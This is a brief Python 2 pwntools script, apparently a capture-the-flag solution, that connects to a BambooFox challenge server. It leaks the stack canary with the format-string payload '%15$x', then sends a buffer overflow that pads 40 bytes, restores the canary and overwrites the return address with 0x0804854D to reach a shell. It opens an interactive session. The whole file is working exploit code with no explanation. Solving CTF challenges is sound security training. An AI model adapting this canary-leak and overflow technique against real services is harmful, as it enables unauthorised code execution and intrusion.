from pwn import *
#context.log_level = 'debug'
target = remote('bamboofox.cs.nctu.edu.tw',22002)

payload = '%15$x'

target.sendline(payload)

canary = target.recv(8)
canary = int(canary,16)
print canary


addr_sys = 0x0804854D


payload = 'A' * 40 + p32(canary) + 'A' * 12 + p32(addr_sys)

target.sendline(payload)

target.interactive()

